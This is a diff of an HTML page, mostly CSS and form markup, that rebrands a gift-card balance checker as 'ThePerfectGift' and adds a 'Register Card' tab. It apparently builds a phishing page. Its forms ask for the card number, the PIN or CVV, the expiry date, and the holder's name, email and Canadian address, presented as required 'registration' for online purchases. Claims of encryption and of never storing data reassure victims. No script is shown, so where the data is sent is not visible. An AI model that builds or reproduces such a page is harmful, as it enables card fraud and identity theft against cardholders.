+    .footer-brand .logo-tagline { color: var(--accent-light); margin-bottom: 1rem; }
+    .footer-brand p {
+      font-size: 0.85rem;
+      line-height: 1.7;
+      max-width: 320px;
+      margin-top: 0.75rem;
+    }
+    .footer-col h4 {
+      color: white;
+      font-size: 0.85rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      margin-bottom: 1.25rem;
+    }
+    .footer-col a {
+      display: block;
+      font-size: 0.85rem;
+      color: rgba(255,255,255,0.6);
+      margin-bottom: 0.75rem;
+      transition: color 0.2s;
+    }
+    .footer-col a:hover { color: white; }
+    .footer-bottom {
+      border-top: 1px solid rgba(255,255,255,0.08);
+      padding: 1.5rem 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.78rem;
+      color: rgba(255,255,255,0.4);
+    }
+    .footer-bottom-links {
+      display: flex;
+      gap: 1.5rem;
+    }
+    .footer-bottom-links a { color: rgba(255,255,255,0.4); transition: color 0.2s; }
+    .footer-bottom-links a:hover { color: rgba(255,255,255,0.8); }
+
+    /* ═══════════════════════════════════
+       LOADING OVERLAY
+    ═══════════════════════════════════ */
     .loading-overlay {
       position: fixed;
       inset: 0;
-      background: rgba(0, 30, 80, 0.85);
-      backdrop-filter: blur(4px);
+      background: rgba(15,29,53,0.88);
+      backdrop-filter: blur(6px);
       display: none;
       align-items: center;
       justify-content: center;
@@ -530,182 +965,279 @@
     .spinner {
       width: 44px;
       height: 44px;
-      border: 4px solid rgba(255,255,255,0.15);
-      border-top-color: var(--simon-gold);
+      border: 4px solid rgba(255,255,255,0.12);
+      border-top-color: var(--accent);
       border-radius: 50%;
       animation: spin 0.8s linear infinite;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
-    .loading-overlay span {
-      font-weight: 600;
-      letter-spacing: 0.5px;
-    }
+    .loading-overlay span { font-weight: 600; letter-spacing: 0.3px; }
 
-    /* Pages */
-    .page { display: none; }
-    .page.active { display: block; animation: fadeIn 0.3s ease-out; }
-    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-    .content-section {
-      background: var(--white);
-      border-radius: 12px;
-      padding: 2.5rem;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-      border: 1px solid var(--border-light);
-      max-width: 800px;
-      margin: 2rem auto 0;
-    }
-    .content-section h2 {
-      font-size: 1.75rem;
-      font-weight: 800;
-      color: var(--simon-blue);
-      margin-bottom: 1rem;
-    }
-    .content-section p {
-      color: var(--text-muted);
-      font-size: 1rem;
-      margin-bottom: 1.25rem;
-      line-height: 1.7;
-    }
-
-    .faq-item {
-      border-bottom: 1px solid var(--border-light);
-      padding: 1.25rem 0;
-    }
-    .faq-item:last-child { border-bottom: none; }
-    .faq-item h4 {
-      font-size: 1rem;
-      font-weight: 700;
-      color: var(--text);
-      margin-bottom: 0.5rem;
-    }
-    .faq-item p { margin-bottom: 0; font-size: 0.925rem; }
-
-    /* Footer */
-    .footer {
-      background: var(--simon-blue-dark);
-      color: rgba(255,255,255,0.7);
-      padding: 2rem;
-      text-align: center;
-      font-size: 0.8rem;
-      margin-top: 3rem;
-    }
-    .footer a { color: rgba(255,255,255,0.85); text-decoration: none; }
-    .footer a:hover { color: white; text-decoration: underline; }
-    .footer-links {
+    /* Tab Switcher */
+    .tab-switcher {
       display: flex;
-      justify-content: center;
-      gap: 1.5rem;
-      margin-bottom: 1rem;
-      flex-wrap: wrap;
+      background: var(--bg);
+      border-radius: 50px;
+      padding: 4px;
+      margin-bottom: 2rem;
+      max-width: 420px;
+      margin-left: auto;
+      margin-right: auto;
+      border: 1px solid var(--border);
     }
+    .tab-btn {
+      flex: 1;
+      padding: 0.7rem 1.25rem;
+      border: none;
+      background: transparent;
+      border-radius: 50px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: var(--text-muted);
+      cursor: pointer;
+      transition: all 0.25s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+    .tab-btn.active {
+      background: var(--primary);
+      color: white;
+      box-shadow: 0 2px 8px rgba(27,42,74,0.2);
+    }
+    .tab-btn:not(.active):hover { color: var(--primary); background: var(--white); }
+    .tab-content { display: none; }
+    .tab-content.active { display: block; animation: fadeSlideUp 0.3s ease-out; }
+
+    /* Register Form Specific */
+    .register-info {
+      background: linear-gradient(135deg, var(--cream), #FFF5EB);
+      border: 1px solid var(--accent-light);
+      border-radius: 10px;
+      padding: 1rem 1.25rem;
+      margin-bottom: 1.5rem;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+    }
+    .register-info svg { flex-shrink: 0; color: var(--accent); margin-top: 1px; }
+    .register-info p { font-size: 0.82rem; color: var(--text-secondary); line-height: 1.5; }
+    .register-info p strong { color: var(--text); }
 
     .hide { display: none !important; }
 
-    /* Mobile */
+    /* ═══════════════════════════════════
+       RESPONSIVE
+    ═══════════════════════════════════ */
+    @media (max-width: 900px) {
+      .hero-grid { grid-template-columns: 1fr; gap: 2.5rem; }
+      .hero { padding: 3rem 0 4rem; }
+      .hero h1 { font-size: 2.4rem; }
+      .hero-visual { max-width: 400px; margin: 0 auto; }
+      .hero-floating-card { display: none; }
+      .balance-grid { grid-template-columns: 1fr; }
+      .features-grid { grid-template-columns: 1fr; gap: 1rem; }
+      .footer-main { grid-template-columns: 1fr; gap: 2rem; }
+      .footer-bottom { flex-direction: column; gap: 1rem; text-align: center; }
+    }
     @media (max-width: 600px) {
-      .header-inner { padding: 0 0.5rem; }
-      .nav a { padding: 0 0.75rem; font-size: 0.8rem; }
-      .hero h1 { font-size: 1.5rem; }
-      .hero p { font-size: 0.9rem; }
-      .main-content { padding: 0 1rem; }
-      .form-card, .info-card { padding: 1.5rem; }
+      .header-inner { padding: 0 1rem; }
+      .nav a:not(.nav-cta) { display: none; }
+      .mobile-menu-btn { display: block; }
+      .hero h1 { font-size: 1.9rem; }
+      .hero-subtitle { font-size: 0.95rem; }
+      .hero-cta-group { flex-direction: column; }
+      .hero-trust { flex-direction: column; gap: 0.75rem; align-items: flex-start; }
+      .container { padding: 0 1rem; }
+      .form-card { padding: 1.75rem; }
       .form-row { grid-template-columns: 1fr; }
+      .section-title { font-size: 1.75rem; }
     }
   </style>
 </head>
 <body>
-  <!-- Top Banner -->
-  <div class="top-banner">
-    Secure Gift Card Balance Verification
+  <!-- Announcement Bar -->
+  <div class="announcement-bar">
+    <strong>ThePerfectGift</strong> &mdash; Fast &amp; secure gift card balance verification. Trusted by thousands.
   </div>
 
   <!-- Header -->
   <header class="header">
     <div class="header-inner">
-      <a href="/" class="logo">
-        <div class="logo-icon">S</div>
-        <div>
-          <div class="logo-text">Simon</div>
-          <div class="logo-sub">Giftcard</div>
+      <a href="/" class="logo nav-link" data-page="home">
+        <div class="logo-mark">
+          <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M20 12v6a2 2 0 01-2 2H6a2 2 0 01-2-2v-6"/>
+            <rect x="2" y="7" width="20" height="5" rx="1"/>
+            <path d="M12 22V7"/>
+            <path d="M12 7H7.5a2.5 2.5 0 110-5C11 2 12 7 12 7z"/>
+            <path d="M12 7h4.5a2.5 2.5 0 100-5C13 2 12 7 12 7z"/>
+          </svg>
+        </div>
+        <div class="logo-wordmark">
+          <span class="logo-name">ThePerfectGift</span>
+          <span class="logo-tagline">Balance Checker</span>
         </div>
       </a>
       <nav class="nav">
         <a href="/" class="nav-link" data-page="home">Check Balance</a>
+        <a href="/register" class="nav-link" data-page="home" data-scroll="balance" data-tab="register">Register Card</a>
+        <a href="/how-it-works" class="nav-link" data-page="home" data-scroll="features">Benefits</a>
         <a href="/faq" class="nav-link" data-page="faq">FAQ</a>
         <a href="/about" class="nav-link" data-page="about">About</a>
+        <a href="/" class="nav-link nav-cta" data-page="home" data-scroll="balance">Check Now</a>
       </nav>
+      <button class="mobile-menu-btn" id="mobileMenuBtn" aria-label="Menu">
+        <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 12h18M3 6h18M3 18h18"/></svg>
+      </button>
     </div>
   </header>
 
-  <!-- Pages -->
+  <!-- PAGES -->
   <main>
-    <!-- HOME PAGE -->
+    <!-- ═══════════════════════════════════ HOME PAGE ═══════════════════════════════════ -->
     <section id="page-home" class="page active">
-      <div class="hero">
-        <h1>Check Your Gift Card Balance</h1>
-        <p>Enter your card details below to view your current available balance.</p>
-      </div>
 
-      <div class="main-content">
-        <div class="content-grid">
-          <!-- Form -->
-          <div class="form-card">
-            <h2>Card Information</h2>
-            <p class="subtitle">Please enter the details found on your gift card.</p>
-
-            <form id="balanceForm">
-              <div id="formFields">
-                <div class="form-group">
-                  <label for="cardNumber">Card Number <span class="required">*</span></label>
-                  <div class="card-number-wrapper">
-                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="23" inputmode="numeric" autocomplete="off">
-                    <div class="card-brand-badge" id="cardBrandBadge"><img id="cardBrandImg" src="" alt=""></div>
-                  </div>
-                  <span class="field-error" id="cardError"></span>
-                </div>
-
-                <div class="form-group">
-                  <label for="cardHolder">Card Holder Name <span style="font-weight:400;color:var(--text-light)">(Optional)</span></label>
-                  <input type="text" id="cardHolder" placeholder="Enter name on card" autocomplete="off">
-                </div>
-
-                <div class="form-row">
-                  <div class="form-group">
-                    <label for="pin">PIN / Security Code <span class="required">*</span></label>
-                    <input type="password" id="pin" placeholder="Enter PIN" maxlength="4" inputmode="numeric" autocomplete="off">
-                    <span class="field-error" id="pinError"></span>
-                  </div>
-                  <div class="form-group">
-                    <label for="expiryDate">Expiration (MM/YY)</label>
-                    <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="off">
-                    <span class="field-error" id="expiryError"></span>
-                  </div>
-                </div>
-
-                <div class="pin-hint">
-                  <svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
-                  <span>The PIN is located on the back of your card. You may need to scratch off the silver coating to reveal it.</span>
-                </div>
-
-                <button type="submit" class="btn-check" id="submitBtn">
-                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
-                  Check Balance
-                </button>
+      <!-- Hero -->
+      <section class="hero">
+        <div class="container">
+          <div class="hero-grid">
+            <div class="hero-content">
+              <div class="hero-badge">
+                <span class="hero-badge-dot"></span>
+                Secure &amp; Verified Service
               </div>
+              <h1>Check Your Gift Card <span>Balance</span> Instantly</h1>
+              <p class="hero-subtitle">Verify your Visa or Mastercard prepaid gift card balance online in seconds. Trusted across Canada. Safe, secure, and completely free.</p>
+              <div class="hero-cta-group">
+                <a href="#balance" class="btn-primary" id="heroCheckBtn">
+                  <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+                  Check Balance Now
+                </a>
+                <a href="/faq" class="btn-secondary nav-link" data-page="faq">Learn More</a>
+              </div>
+              <div class="hero-trust">
+                <div class="hero-trust-item">
+                  <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+                  256-bit Encryption
+                </div>
+                <div class="hero-trust-item">
+                  <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+                  Instant Results
+                </div>
+                <div class="hero-trust-item">
+                  <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>
+                  100% Free
+                </div>
+              </div>
+            </div>
 
-              <div id="result" class="balance-result"></div>
-              <button type="button" class="btn-another" id="checkAnother">Check Another Card</button>
-            </form>
+            <div class="hero-visual">
+              <div class="hero-floating-card">
+                <div class="fc-brand">ThePerfectGift</div>
+                <div class="fc-amount">$150.00</div>
+                <div class="fc-label">Available Balance</div>
+                <div class="fc-chip"></div>
+              </div>
+              <div class="hero-image-wrapper">
+                <img src="https://i.pinimg.com/736x/74/e4/45/74e44587d628892f546d1fd436fd4fd8.jpg" alt="Woman holding gift cards" loading="eager"
+                  onerror="this.parentElement.style.background='linear-gradient(135deg, var(--accent-light) 0%, var(--cream) 100%)'; this.style.display='none';">
+                <div class="hero-image-overlay">
+                  <div class="hero-card-badge">
+                    <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
+                    Visa &amp; Mastercard Supported
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Balance Checker -->
+      <section class="balance-section" id="balance">
+        <div class="container">
+          <div class="section-header">
+            <div class="section-label">
+              <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
+              Card Services
+            </div>
+            <h2 class="section-title">Manage Your Gift Card</h2>
+            <p class="section-subtitle">Check your balance or register your card for online use.</p>
+
+            <div class="tab-switcher">
+              <button class="tab-btn active" data-target="tab-balance" id="tabBalance">
+                <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+                Check Balance
+              </button>
+              <button class="tab-btn" data-target="tab-register" id="tabRegister">
+                <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z"/></svg>
+                Register Card
+              </button>
+            </div>
           </div>
 
-          <!-- Info Sidebar -->
-          <div>
-            <!-- Gift Card Visual -->
-            <div class="info-card" style="margin-bottom: 1.5rem;">
-              <div class="gc-visual">
-                <div class="gc-brand">Simon</div>
-                <div class="gc-type">Gift Card</div>
+          <!-- TAB: Check Balance -->
+          <div class="tab-content active" id="tab-balance">
+          <div class="balance-grid">
+            <!-- Form -->
+            <div class="form-card">
+              <div class="form-card-header">
+                <h2>Card Information</h2>
+                <p>Enter the details found on your gift card.</p>
+              </div>
+
+              <form id="balanceForm">
+                <div id="formFields">
+                  <div class="form-group">
+                    <label for="cardNumber">Card Number <span class="required">*</span></label>
+                    <div class="card-number-wrapper">
+                      <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="23" inputmode="numeric" autocomplete="off">
+                      <div class="card-brand-badge" id="cardBrandBadge"><img id="cardBrandImg" src="" alt=""></div>
+                    </div>
+                    <span class="field-error" id="cardError"></span>
+                  </div>
+
+                  <div class="form-group">
+                    <label for="cardHolder">Cardholder Name <span class="optional">(Optional)</span></label>
+                    <input type="text" id="cardHolder" placeholder="Name on card" autocomplete="off">
+                  </div>
+
+                  <div class="form-row">
+                    <div class="form-group">
+                      <label for="pin">PIN / Security Code <span class="required">*</span></label>
+                      <input type="password" id="pin" placeholder="Enter PIN" maxlength="4" inputmode="numeric" autocomplete="off">
+                      <span class="field-error" id="pinError"></span>
+                    </div>
+                    <div class="form-group">
+                      <label for="expiryDate">Expiration (MM/YY)</label>
+                      <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="off">
+                      <span class="field-error" id="expiryError"></span>
+                    </div>
+                  </div>
+
+                  <div class="pin-hint">
+                    <svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+                    <span>The PIN is located on the back of your card. You may need to scratch off the silver coating to reveal it.</span>
+                  </div>
+
+                  <button type="submit" class="btn-check" id="submitBtn">
+                    <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+                    Check Balance
+                  </button>
+                </div>
+
+                <div id="result" class="balance-result"></div>
+                <button type="button" class="btn-another" id="checkAnother">Check Another Card</button>
+              </form>
+            </div>
+
+            <!-- Info Panel -->
+            <div class="info-panel">
+              <div class="gc-visual-card">
+                <div class="gc-brand-name">ThePerfectGift</div>
+                <div class="gc-type">Prepaid Card</div>
                 <div class="gc-chip"></div>
                 <div class="gc-number" id="gcNumber">&bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull;</div>
                 <div class="gc-bottom">
@@ -720,97 +1252,319 @@
                   <div id="gcBrand" style="height:32px;display:flex;align-items:center;"></div>
                 </div>
               </div>
-            </div>
 
-            <!-- How It Works -->
-            <div class="info-card">
-              <div class="info-title">
-                <svg width="20" height="20" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
-                How It Works
-              </div>
-
-              <div class="info-item">
-                <div class="info-icon">
-                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
+              <div class="how-it-works-card">
+                <div class="hiw-title">
+                  <svg width="20" height="20" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
+                  How It Works
                 </div>
-                <div class="info-text">
-                  <h4>1. Enter Card Details</h4>
-                  <p>Type your 16-digit card number and 4-digit PIN from the back of your card.</p>
+                <div class="hiw-step">
+                  <div class="hiw-num">1</div>
+                  <div class="hiw-text">
+                    <h4>Enter Card Details</h4>
+                    <p>Type your 16-digit card number and PIN from the back of your card.</p>
+                  </div>
                 </div>
-              </div>
-
-              <div class="info-item">
-                <div class="info-icon">
-                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+                <div class="hiw-step">
+                  <div class="hiw-num">2</div>
+                  <div class="hiw-text">
+                    <h4>Secure Verification</h4>
+                    <p>Your data is encrypted and securely transmitted for balance lookup.</p>
+                  </div>
                 </div>
-                <div class="info-text">
-                  <h4>2. Secure Verification</h4>
-                  <p>Your data is encrypted and securely transmitted for balance lookup.</p>
-                </div>
-              </div>
-
-              <div class="info-item">
-                <div class="info-icon">
-                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
-                </div>
-                <div class="info-text">
-                  <h4>3. View Balance</h4>
-                  <p>Your available balance is displayed instantly on screen.</p>
+                <div class="hiw-step">
+                  <div class="hiw-num">3</div>
+                  <div class="hiw-text">
+                    <h4>View Your Balance</h4>
+                    <p>Your available balance is displayed instantly on screen.</p>
+                  </div>
                 </div>
               </div>
             </div>
           </div>
+          </div><!-- /tab-balance -->
+
+          <!-- TAB: Register Card -->
+          <div class="tab-content" id="tab-register">
+          <div class="balance-grid">
+            <div class="form-card">
+              <div class="form-card-header">
+                <h2>Register Your Card</h2>
+                <p>Register your prepaid card before using it online.</p>
+              </div>
+
+              <div class="register-info">
+                <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+                <p><strong>Important:</strong> You must register your prepaid card before making online purchases. This links your name and address to the card for verification.</p>
+              </div>
+
+              <form id="registerForm">
+                <div id="registerFields">
+                  <div class="form-group">
+                    <label for="regCardNumber">Card Number <span class="required">*</span></label>
+                    <div class="card-number-wrapper">
+                      <input type="text" id="regCardNumber" placeholder="0000 0000 0000 0000" maxlength="23" inputmode="numeric" autocomplete="off">
+                    </div>
+                    <span class="field-error" id="regCardError"></span>
+                  </div>
+
+                  <div class="form-row">
+                    <div class="form-group">
+                      <label for="regPin">PIN / CVV <span class="required">*</span></label>
+                      <input type="password" id="regPin" placeholder="Enter PIN" maxlength="4" inputmode="numeric" autocomplete="off">
+                      <span class="field-error" id="regPinError"></span>
+                    </div>
+                    <div class="form-group">
+                      <label for="regExpiry">Expiration (MM/YY) <span class="required">*</span></label>
+                      <input type="text" id="regExpiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="off">
+                      <span class="field-error" id="regExpiryError"></span>
+                    </div>
+                  </div>
+
+                  <div class="form-group">
+                    <label for="regName">Full Name <span class="required">*</span></label>
+                    <input type="text" id="regName" placeholder="Enter your full name" autocomplete="off">
+                    <span class="field-error" id="regNameError"></span>
+                  </div>
+
+                  <div class="form-group">
+                    <label for="regEmail">Email Address <span class="required">*</span></label>
+                    <input type="email" id="regEmail" placeholder="your@email.com" autocomplete="off">
+                    <span class="field-error" id="regEmailError"></span>
+                  </div>
+
+                  <div class="form-group">
+                    <label for="regAddress">Street Address <span class="required">*</span></label>
+                    <input type="text" id="regAddress" placeholder="123 Main Street" autocomplete="off">
+                    <span class="field-error" id="regAddressError"></span>
+                  </div>
+
+                  <div class="form-row">
+                    <div class="form-group">
+                      <label for="regCity">City <span class="required">*</span></label>
+                      <input type="text" id="regCity" placeholder="Toronto" autocomplete="off">
+                    </div>
+                    <div class="form-group">
+                      <label for="regProvince">Province <span class="required">*</span></label>
+                      <select id="regProvince" style="width:100%;padding:0.8rem 1rem;font-size:0.95rem;border:1.5px solid var(--border);border-radius:10px;font-family:inherit;color:var(--text);background:var(--white);cursor:pointer;">
+                        <option value="">Select Province</option>
+                        <option value="AB">Alberta</option>
+                        <option value="BC">British Columbia</option>
+                        <option value="MB">Manitoba</option>
+                        <option value="NB">New Brunswick</option>
+                        <option value="NL">Newfoundland and Labrador</option>
+                        <option value="NS">Nova Scotia</option>
+                        <option value="NT">Northwest Territories</option>
+                        <option value="NU">Nunavut</option>
+                        <option value="ON">Ontario</option>
+                        <option value="PE">Prince Edward Island</option>
+                        <option value="QC">Quebec</option>
+                        <option value="SK">Saskatchewan</option>
+                        <option value="YT">Yukon</option>
+                      </select>
+                    </div>
+                  </div>
+
+                  <div class="form-group">
+                    <label for="regPostal">Postal Code <span class="required">*</span></label>
+                    <input type="text" id="regPostal" placeholder="A1A 1A1" maxlength="7" autocomplete="off" style="text-transform:uppercase;">
+                  </div>
+
+                  <div class="pin-hint">
+                    <svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+                    <span>Your information is securely encrypted. We use this data only to register your card for online transactions.</span>
+                  </div>
+
+                  <button type="submit" class="btn-check" id="registerBtn">
+                    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z"/></svg>
+                    Register Card
+                  </button>
+                </div>
+
+                <div id="registerResult" class="balance-result"></div>
+                <button type="button" class="btn-another" id="registerAnother">Register Another Card</button>
+              </form>
+            </div>
+
+            <!-- Info Panel for Register -->
+            <div class="info-panel">
+              <div class="gc-visual-card">
+                <div class="gc-brand-name">ThePerfectGift</div>
+                <div class="gc-type">Prepaid Card</div>
+                <div class="gc-chip"></div>
+                <div class="gc-number">&bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull;</div>
+                <div class="gc-bottom">
+                  <div>
+                    <div class="gc-label">Card Holder</div>
+                    <div class="gc-value">GIFT CARD</div>
+                  </div>
+                  <div>
+                    <div class="gc-label">Valid Thru</div>
+                    <div class="gc-value">MM/YY</div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="how-it-works-card">
+                <div class="hiw-title">
+                  <svg width="20" height="20" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"/></svg>
+                  Why Register?
+                </div>
+                <div class="hiw-step">
+                  <div class="hiw-num">1</div>
+                  <div class="hiw-text">
+                    <h4>Enable Online Purchases</h4>
+                    <p>Registration is required to use your prepaid card for online shopping.</p>
+                  </div>
+                </div>
+                <div class="hiw-step">
+                  <div class="hiw-num">2</div>
+                  <div class="hiw-text">
+                    <h4>Address Verification</h4>
+                    <p>Online merchants verify your billing address matches the card registration.</p>
+                  </div>
+                </div>
+                <div class="hiw-step">
+                  <div class="hiw-num">3</div>
+                  <div class="hiw-text">
+                    <h4>Secure &amp; Protected</h4>
+                    <p>Your registered card is protected and can be used at any online retailer.</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          </div><!-- /tab-register -->
+
         </div>
-      </div>
+      </section>
+
+      <!-- Features -->
+      <section class="features-section" id="features">
+        <div class="container">
+          <div class="section-header" style="text-align:center;">
+            <div class="section-label">Why Choose Us</div>
+            <h2 class="section-title">The Easiest Way to Check Your Balance</h2>
+            <p class="section-subtitle">No phone calls. No store visits. Just instant, secure results.</p>
+          </div>
+          <div class="features-grid">
+            <div class="feature-card">
+              <div class="feature-icon">
+                <svg width="28" height="28" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+              </div>
+              <h3>Bank-Level Security</h3>
+              <p>Your card information is protected with 256-bit SSL encryption. We never store your data after the balance check.</p>
+            </div>
+            <div class="feature-card">
+              <div class="feature-icon">
+                <svg width="28" height="28" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+              </div>
+              <h3>Instant Results</h3>
+              <p>Get your balance in seconds. No waiting on hold or navigating complex phone menus. Fast and effortless.</p>
+            </div>
+            <div class="feature-card">
+              <div class="feature-icon">
